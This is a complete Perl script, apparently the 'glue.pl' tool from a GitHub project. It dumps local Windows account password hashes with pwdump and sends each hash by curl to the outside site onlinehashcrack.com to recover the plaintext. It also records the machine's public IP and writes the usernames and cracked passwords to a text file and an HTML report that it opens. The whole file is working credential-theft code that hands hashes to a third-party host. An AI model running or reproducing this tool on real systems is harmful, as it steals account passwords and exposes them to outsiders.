#!/usr/bin/env perl

use strict;
use warnings;

use Cwd;

sub arch {
	my $a = "32";

	if ((lc $ENV{'PROCESSOR_ARCHITECTURE'} eq "amd64") or (lc $ENV{'PROCESSOR_ARCHITEW6432'} eq "amd64")) {
		$a = "64";
	}

	return $a;
}

sub os {
	my $o = $^O;

	if ($o eq "MSWin32") {
		$o = "Windows";
	}
	else {
		$o = "Unix";
	}

	return $o;
}

sub canhazip {
	my $command = "curl -s http://icanhazip.com 2>&1";
	my $ip = qx($command);
	$ip =~ s/\n//;

	return $ip;
}

sub dump_accounts {
	my $a = arch;
	my $flag64 = "";
	$flag64 = "-x" unless $a eq "32";

	my $command = "pwdump $flag64 127.0.0.1 2>&1";
	my $output = qx($command);
	
	my $accounts = {};
	
	while ($output =~ m/(.*):[0-9]+:.*:([a-zA-Z0-9]+):::/g) {
		my ($username, $hash) = ($1, $2);
		$accounts->{$username} = $hash;
	}

	return $accounts;
}

sub rainbow {
	my $hash = shift;

	my $password = "";

	my $command = "curl -d \"hashToSearch=$hash&searchHash=Search\" http://www.onlinehashcrack.com/free-hash-reverse.php 2>&1";

	my $delay = 2; # sec
	sleep $delay; # prevent DoS

	my $output = qx($command);

	if ($output =~ m/letter\-spacing:1\.2px">(.*)<\/b><br \/>/) {
		$password = $1;
	}

	return $password;
}

sub record {
	my ($ip, $decrypted_accounts, $webpage) = @_;

	$ip =~ s/\./\-/g;

	my $record_filename = "$ip.txt";

	open(RECORD, ">$record_filename");

	while (my ($username, $password) = each(%$decrypted_accounts)) {
		print RECORD "Username: $username\n";
		print RECORD "Password: $password\n\n";
	}

	close(RECORD);

	my $begin_content = <<END;
<html>
<head>
<title>Report</title>
<link rel="stylesheet" href="stylesheet.css" type="text/css" />
</head>
<body>
<center>
<h1>Accounts on this computer</h1>
<h4><a href="https://github.com/mcandre/glue">glue.pl</a></h4>
END

	my $end_content = <<END;
</center>
</body>
</html>
END

	open(WEBPAGE, ">$webpage");

	print WEBPAGE $begin_content;

	while (my ($username, $password) = each(%$decrypted_accounts)) {
		my $account = "<h3>$username / <span class=\"password\">$password</span></h3>";
		$account = "<h3>$username</h3>" if $password eq "";

		print WEBPAGE $account;
	}

	print WEBPAGE $end_content;

	close(WEBPAGE);
}

sub show {
	my ($ip, $decrypted_accounts, $webpage) = @_;

	my $o = os;
	my $binary = "open";
	$binary = "start" if $o eq "Windows";

	my $command = "$binary $webpage";
	system $command;
}

sub main {
	my $ip = canhazip;

	my $encrypted_accounts = dump_accounts;
	my $decrypted_accounts = {};

	print "Accounts on this computer\n";

	while (my ($username, $hash) = each(%$encrypted_accounts)) {
		my $password = rainbow $hash;
		$decrypted_accounts->{$username} = $password;

		print "\nUsername: $username\n";
		print "Password: $password\n" unless $password eq "";
	}

	my $webpage = "report.html";

	record($ip, $decrypted_accounts, $webpage);
	show($ip, $decrypted_accounts, $webpage);
}

unless(caller) { main; }